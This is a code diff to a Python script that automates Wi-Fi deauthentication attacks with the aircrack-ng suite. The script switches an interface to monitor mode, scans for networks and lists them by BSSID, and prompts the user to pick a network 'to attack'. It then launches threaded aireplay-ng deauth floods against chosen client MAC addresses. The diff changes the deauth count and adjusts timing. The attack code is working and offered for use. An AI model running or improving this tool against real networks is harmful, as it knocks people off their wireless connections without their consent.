@@ -81,7 +81,7 @@ def set_monitor_mode(inf):
         subprocess.run(["airmon-ng", "check", "kill"], check=True)
         time.sleep(1)
         subprocess.run(["ip", "link", "set", inf, "down"],stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, check=True)
-        time.sleep(2)
+        time.sleep(1)
         subprocess.run(["iwconfig", inf, "mode", "monitor"],stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, check=True)
         time.sleep(2)
         subprocess.run(["ip", "link", "set", inf, "up"],stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, check=True)
@@ -93,14 +93,15 @@ def set_monitor_mode(inf):
             print(f"{green}[+] {inf} switched to 'monitor' mode successfully.{reset}\n")
     except Exception as e:
         print(f"{red}[!] Error switching to 'monitor' mode: {e}{reset}")
+        exit()
 
-def check_for_essid(essid, lst):
-    """Check if an ESSID is already in the list of networks."""
+def check_for_bssid(bssid, lst):
+    """Check if an BSSID is already in the list of networks."""
     check_status = True
     if len(lst) == 0:
         return check_status
     for item in lst:
-        if essid in item["ESSID"]:
+        if bssid in item["BSSID"]:
             check_status = False
     return check_status
 
@@ -144,7 +145,7 @@ def parse_wifi_networks():
                                 pass
                             elif row["BSSID"] == "Station MAC":
                                 break
-                            elif check_for_essid(row["ESSID"], active_wireless_networks):
+                            elif check_for_bssid(row["BSSID"], active_wireless_networks):
                                 active_wireless_networks.append(row)
  
             print(f"{yellow}[*]{reset} Scanning. Press Ctrl+C when you want to select which wireless network you want to attack.\n")
@@ -228,18 +229,19 @@ def filter_clients():
 
 def deauth_attack(network_mac, target_mac, interface):
     """Deauth attack on selected clients."""
-    subprocess.Popen(["aireplay-ng", "--deauth", "0", "-a", network_mac, "-c", target_mac, interface])
+    subprocess.Popen(["aireplay-ng", "--deauth", "1000", "-a", network_mac, "-c", target_mac, interface])
 
 def restore_managed_mode(inf):
     """Revert interface to default managed mode."""
     try:
         print(f"{yellow}[*]{reset} Switching to default 'managed' mode...")
+        time.sleep(2)
         subprocess.run(["ip", "link", "set", inf, "down"], check=True)
-        time.sleep(2)
-        subprocess.run(["iw", inf, "set", "type", "managed"], check=True)
-        time.sleep(2)
-        subprocess.run(["ip", "link", "set", inf, "up"], check=True)
         time.sleep(1)
+        subprocess.run(["iw", inf, "set", "type", "managed"], check=True)
+        time.sleep(1)
+        subprocess.run(["ip", "link", "set", inf, "up"], check=True)
+        time.sleep(2)
         subprocess.run(["service", "NetworkManager", "start"], check=True)
         mode = subprocess.run(["iw", "dev", inf, "info"], capture_output=True).stdout.decode()
         if "managed" not in mode.lower():
@@ -265,12 +267,12 @@ def main():
     subprocess.run(["airmon-ng", "start", inter, hackchannel])
     
     threads = []
-    time.sleep(2)
+    time.sleep(1)
     for client in clients_to_deauth:
-        time.sleep(2)
         t = threading.Thread(target=deauth_attack, args=[hackbssid, client, inter], daemon=True)
         t.start()
         threads.append(t)
+        time.sleep(1)
         
     try:
         while True:
@@ -278,6 +280,7 @@ def main():
 
     except KeyboardInterrupt:
         print(f"\n{purple}[#]{reset} Stopping Deauth..")
+        time.sleep(2)
         restore_managed_mode(inter)
 
     
